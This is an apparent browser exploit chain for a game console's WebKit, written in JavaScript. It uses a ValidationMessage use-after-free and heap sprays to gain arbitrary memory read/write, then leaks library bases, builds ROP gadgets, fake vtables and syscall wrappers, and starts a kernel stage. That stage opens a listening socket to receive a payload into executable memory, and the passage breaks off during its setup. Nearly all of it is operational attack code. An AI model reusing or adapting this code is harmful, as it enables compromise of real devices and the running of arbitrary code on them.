const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;

const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;

const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;

const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;

var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];

var g_frames = [];

var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;

var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;

var original_context;
var modified_context;
var fakeVtable_setjmp;
var fakeVtable_longjmp;

var textAreaVtPtr;
var textAreaVtable;

var g_obj_str = {};

var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";

var g_round = 1;
var g_input = null;

var guess_htmltextarea_addr = new Int64("0x2031b00d8");

var master_b = new Uint32Array(2);
var slave_b =  new Uint32Array(2);
var slave_addr;
var slave_buf_addr;
var master_addr;

function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }
  
  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }

/* Executed after deleteBubbleTree */
function setupRW() {
	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("[+] Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] Failed to setup a relative R/W primitive");

	debug_log("[+] Setting up arbitrary R/W");

	/* Retrieving the ArrayBuffer address using the relative read */
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));

	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;

	/* Overding the length of one JSArrayBufferView with a known value */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;

	/* Looking for the slave JSArrayBufferView */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null)
		die("[!] Didn't found the slave JSArrayBufferView");

	/* Extending the JSArrayBufferView length */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;

	debug_log("[+] Testing arbitrary R/W");

	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
		die("[!] Failed to setup arbitrary R/W primitive");

	debug_log("[+] Succesfully got arbitrary R/W!");

	/* Restore the overidden vtable pointer */
	write64(guess_htmltextarea_addr, saved_vtable);

	/* Cleanup memory */
	cleanup();

	/* Set up addrof/fakeobj primitives */
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Failed to setup addrof/fakeobj primitives");
	debug_log("[+] Succesfully got addrof/fakeobj");

	/* Getting code execution */
	/* ... */
	var leak_slave = addrof(slave_b);
	var slave_addr = read64(leak_slave.add(0x10));

	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
	var leak_master = addrof(master_b);
	write64(leak_master.add(0x10), leak_slave.add(0x10));
	var prim = {
		write8: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			if(val instanceof int64) {
				slave_b[0] = val.low;
				slave_b[1] = val.hi;
			}
			else {
				slave_b[0] = val;
				slave_b[1] = 0;
			}

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write4: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			slave_b[0] = val;

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write2: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			let tmp_val = slave_b[0] & 0xFFFF0000;
			slave_b[0] = tmp_val | (val & 0xFFFF);

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write1: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			let tmp_val = slave_b[0] & 0xFFFFFF00;
			slave_b[0] = tmp_val | (val & 0xFF);

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		read8: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = new int64(slave_b[0], slave_b[1]);
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		read4: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = slave_b[0];
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		read2: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = slave_b[0] & 0xFFFF0000;
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		read1: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = slave_b[0] & 0xFFFFFF00;
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		leakval: function(val) {
			g_ab_slave.leakme = val;
			master_b[0] = g_jsview_butterfly.low32() - 0x10;
			master_b[1] = g_jsview_butterfly.hi32();
			var r = new int64(slave_b[0], slave_b[1]);
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
	};
	window.prim = prim;
	try{
		stage2();
	}catch(e){
		alert(e);
	}
}

function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}

function read64(addr) {
	return new Int64(read(addr, 8));
}

function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}

function write64(addr, data) {
	write(addr, data.bytes());
}

function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}

function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}

function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound2() {
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();

	setTimeout(setupRW, 6000);
}


/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("[+] Looking for the smashed StringImpl...");

	var arr_str = Object.getOwnPropertyNames(g_obj_str);

	/* Looking for the smashed string */
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("[+] StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null)
		die("[!] Failed to setup a relative read primitive");

	debug_log("[+] Got a relative read");

        var tmp_spray = {};
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;

	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

	/* Spraying JSView */
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		/* The last allocated are more likely to be allocated after our relative read */
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;

	/*
	 * Force JSC ref on FastMalloc Heap
	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
	 */
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}

	/* 
	 * /!\
	 * This part must avoid as much as possible fastMalloc allocation
	 * to avoid re-using the targeted object 
	 * /!\ 
	 */
	/* Use relative read to find our JSC obj */
	/* We want a JSView that is allocated after our relative read */
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	/* 
	 * /!\
	 * Critical part ended-up here
	 * /!\ 
	 */

	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);

	/* Run the exploit again */
	prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
	/* Force allocation of StringImpl obj. beyond Timer address */
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

	/* Checking for leaked data */
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	dumpTargetObj();

	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

	/*
	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
	 * the next 5s
	 */
	setTimeout(leakJSC, 6000);
}

function handle2() {
	/* focus elsewhere */
	input2.focus();
}

function reuseTargetObj() {
	/* Delete ValidationMessage instance */
	document.body.appendChild(g_input);

	/*
	 * Free ValidationMessage neighboors.
	 * SmallLine is freed -> SmallPage is cached
	 */
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');

	/* Get back target object */
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);

		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

		g_arr_ab_1.push(view);
	}

	if (g_round == 1) {
		/*
		 * Spray a couple of StringImpl obj. prior to Timer allocation
		 * This will force Timer allocation on same SmallPage as our Strings
		 */
		sprayStringImpl(0, SPRAY_STRINGIMPL);

		g_frames = [];
		g_round += 1;
		g_input = input3;

		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}

function dumpTargetObj() {
	debug_log("[+] m_timer: " + g_timer_leak);
	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
	debug_log("[+] m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("[+] Found fake ValidationMessage");

			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}

			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}

function prepareUAF() {
	g_input.setCustomValidity("ps4");

	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}

	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);

	/* First half spray */
	for (let i = 0; i < NB_FRAMES / 2; i++)
		g_frames[i].setAttribute("rows", g_rows1);

	/* Instantiate target obj */
	g_input.reportValidity();

	/* ... and the second half */
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);

	g_input.setAttribute("onfocus", "reuseTargetObj()");
	g_input.autofocus = true;
}

/* HTMLElement spray */
function sprayHTMLTextArea() {
	debug_log("[+] Spraying HTMLTextareaElement ...");

	let textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}

function go() {
	/* Init spray */
	sprayHTMLTextArea();

	g_input = input1;
	/* Shape heap layout for obj. reuse */
	prepareUAF();
}

var p;
var chain;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x00722C20; // match
const OFFSET_WK_fclose_import           = 0x021A6468; // match, this will be the import for libcinternal, it's the address of address
const OFFSET_WK_getpid_import           = 0x021A6840; // match, this will be the import for libkernel_web, it's the address of address
const OFFSET_WK_setjmp_gadget_one       = 0x00523675; // match 48 8B 01 48 89 CF FF A0 A8 00 00 00 // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
const OFFSET_WK_setjmp_gadget_two       = 0x001F3663; // match 48 8B 7F 10 FF 60 08 // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
const OFFSET_WK_longjmp_gadget_one      = 0x00523675; // match 48 8B 01 48 89 CF FF A0 A8 00 00 00 // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
const OFFSET_WK_longjmp_gadget_two      = 0x001F3663; // match 48 8B 7F 10 FF 60 08 // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]


const OFFSET_lc_fclose                  = 0x000003F0; // match, this will be the export for libcinternal
const OFFSET_libcint_memset             = 0x000125C0;
const OFFSET_libcint_setjmp             = 0x0005D2D0;
const OFFSET_libcint_longjmp            = 0x0005D320;

const OFFSET_lk_getpid                          = 0x00031C30; // match, this will be the export for libkernel_web
const OFFSET_lk_pthread_create_name_np          = 0x00001910; // match
const OFFSET_lk_pthread_join                    = 0x0002C8E0; // match
const OFFSET_lk_pthread_exit                    = 0x0001E400; // match
const OFFSET_lk_pthread_self                    = 0x00021AE0; // match
const OFFSET_lk_pthread_setschedparam           = 0x0002F680; // match
const OFFSET_lk__thread_list                    = 0x0005C198; // match

const OFFSET_WORKER_STACK_OFFSET                = 0x0007FB88; // maybe, maybe not

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret":             0x0000004c, // C3
  "pop rdi":         0x001d041d, // 5F C3
  "pop rsi":         0x00025f17, // 5E C3
  "pop rdx":         0x000421b2, // 5A C3
  "pop rcx":         0x0001fe95, // 59 C3
  "pop r8":          0x001e48de, // 47 58 C3
  "pop r9":          0x00451af1, // 47 59 C3
  "pop rax":         0x00020eb0, // 58 C3
  "pop rsp":         0x00025cd0, // 5C C3

  "mov [rdi], rax":  0x00008c2a, // 48 89 07 C3
  "mov [rdi], eax":  0x00008c2b, // 89 07 C3
  "mov [rdi], rsi":  0x000133e0, // 48 89 37 C3
  "cmp [rcx], edi":  0x000d2401, // 39 39 C3

  "cmp [rcx], eax" : 0x0063FD12, // 39 01 C3
  "setne al":        0x00003340, // 0F 95 C0 C3
  "sete al":         0x0000ee14, // 0F 94 C0 C3
  "seta al":         0x00119f54, // 0F 97 C0 C3
  "setb al":         0x00031e34, // 0F 92 C0 C3
  "setle al":        0x000a2e26, // 0F 9E C0 C3
  "setl al":         0x0042b7cc, // 0F 9C C0 C3
  "setge al":        0x0048d222, // 0F 9D C0 C3
  "setg al":         0x0040c547, // 0F 9F C0 C3
  "shl rax, 3":      0x012347a3, // 48 C1 E0 03 C3
  "add rax, rdx":    0x008229f6, // 48 01 D0 C3
  "mov rax, [rax]":  0x0001ac12, // 48 8B 00 C3
  "inc dword [rax]": 0x00453dea, // FF 00 C3
  "infpoop":         0x000183d9  // EB FE
};

var textArea = document.createElement("textarea");

function stage2() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(webKitBase.add32(OFFSET_WK_fclose_import));
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_fclose);
  debug_log("libSceLibcInternalBase: 0x" + libSceLibcInternalBase);

  libKernelBase = p.read8(webKitBase.add32(OFFSET_WK_getpid_import));
  libKernelBase.sub32inplace(OFFSET_lk_getpid);
  debug_log("libKernelBase: 0x" + libKernelBase);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  

  //alert("before malloc");

  fakeVtable_setjmp = p.malloc32(0x200);
  fakeVtable_longjmp = p.malloc32(0x200);
  original_context = p.malloc32(0x40);
  modified_context = p.malloc32(0x40);

  //alert("after malloc");

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;
  //alert("before syscalls");

//0.85.070
  window.syscalls[3] = 		window.libKernelBase.add32(0x322d0);//read
  window.syscalls[4] = 		window.libKernelBase.add32(0x30c90);//write
  window.syscalls[5] = 		window.libKernelBase.add32(0x300d0);//open
  window.syscalls[6] = 		window.libKernelBase.add32(0x2fed0);// sys_close
  window.syscalls[20] = 	window.libKernelBase.add32(0x31c30);//getpid
  window.syscalls[23] = 	window.libKernelBase.add32(0x2fd50);//setuid
  window.syscalls[24] = 	window.libKernelBase.add32(0x31070); // sys_getuid
  window.syscalls[0x01E] =  window.libKernelBase.add32(0x2fc20); // sys_accept
  window.syscalls[54] = 	window.libKernelBase.add32(0x30110);//ioctl
  window.syscalls[74] = 	window.libKernelBase.add32(0x30660);//mprotect
  window.syscalls[97] = 	window.libKernelBase.add32(0x32100);//socket
  window.syscalls[98] = 	window.libKernelBase.add32(0x303b0);//connect
  window.syscalls[0x068] = 	window.libKernelBase.add32(0x30960); // sys_bind
  window.syscalls[0x06A] =  window.libKernelBase.add32(0x30820); // sys_listen
  window.syscalls[105] = 	window.libKernelBase.add32(0x2fff0);//setsockopt
  window.syscalls[118] = 	window.libKernelBase.add32(0x30250);//getsockopt
  window.syscalls[324] = 	window.libKernelBase.add32(0x32350);//mlockall
  window.syscalls[477] = 	window.libKernelBase.add32(0x2ffd0);//mmap
  window.syscalls[533] = 	window.libKernelBase.add32(0x32310);//jitshm_create
  window.syscalls[534] = 	window.libKernelBase.add32(0x322f0);//jitshm_alias
  window.syscalls[585] = 	window.libKernelBase.add32(0x2fb60); //sys_is_in_sandbox
  window.syscalls[687] = 	window.libKernelBase.add32(0x31fc0);//pipe2
  window.syscalls[0x24F] =  window.libKernelBase.add32(0x30070); // sys_dynlib_dlsym
  //alert("after syscalls");

  p.write8(kstr, orig_kview_buf);
  //alert("about to create rop");
  chain = new rop();
    
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  
}

function stage3() {
  const AF_INET = 2;
  const SOCK_STREAM  = 1;
  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;//ps5
  const PKTOPTS_RTHDR_OFFSET = 0x70;//ps5, fixed
  const PKTOPTS_TCLASS_OFFSET = 0xC0;//ps5, fixed

  const PROC_UCRED_OFFSET = 0x40;//ps5, same
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xBC;//ps5, fixed


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x130;//ps5, match

  const KERNEL_M_IP6OPT_OFFSET = 0x1E77640;//match
  const KERNEL_MALLOC_OFFSET = 0xAA33C0;//match
  const KERNEL_ALLPROC_OFFSET = 0x3851B48;//match
  const KERNEL_PMAP_STORE_OFFSET = 0x4096198;//match

  const NUM_SPRAY_SOCKS = 99;//i've got 99 sockets but the bitch ain't one
  const NUM_LEAK_SOCKS = 99;
  const NUM_SLAVE_SOCKS = 300;
  
  // dump code (slow) - specter
  function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
  }

  function aton(ip) {
      let chunks = ip.split('.');
      let addr = 0;
      for(let i = 0; i < 4; i++) {
          addr |= (parseInt(chunks[i]) << (i * 8));
      }
      return addr >>> 0;
  }

  function build_addr(buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
  }

  const DUMP_NET_IP   = "0.0.0.0"; // edit this, mr SocraticBliss
  let DUMP_NET_ADDR = aton(DUMP_NET_IP); 
  let DUMP_NET_PORT = htons(9020);

  let dump_sock_addr_store    = p.malloc(0x10);
  let dump_sock_send_sz_store = p.malloc(0x4);
  let dump_sock_connected     = 0;



  for (let i = 0; i < 0x10; i += 0x8) {
    p.write8(dump_sock_addr_store.add32(i), 0);
  }

  build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, 0);
  
  let dump_sock_fd = chain.syscall(0x061, 2, 1, 0);
  //let elf_loader_sock_fd = chain.syscall(97, AF_INET, SOCK_STREAM, 0).low << 0;
  //alert("opened dump sock=0x" + dump_sock_fd);
  
      const OFFSET_ERRNO = 0x911A8;
	let errno = 0;
	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
	//alert ("payload_buffer: 0x" + payload_buffer);
	
	let bind = chain.syscall(0x068, dump_sock_fd, dump_sock_addr_store, 16);
	//alert ("bind: 0x" + bind);
	
	let listen = chain.syscall(0x6A, dump_sock_fd, 10);
	alert ("listen: 0x" + listen);
		
	let accepted = chain.syscall(0x1E, dump_sock_fd, 0, 0);
	//alert("accepted: 0x" + accepted);
	
  
    // Create pipe pair and ultimate r/w prims
  let pipe_mem = p.malloc(8);

  chain.syscall(0x2AF, pipe_mem, 0); // pipe2

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
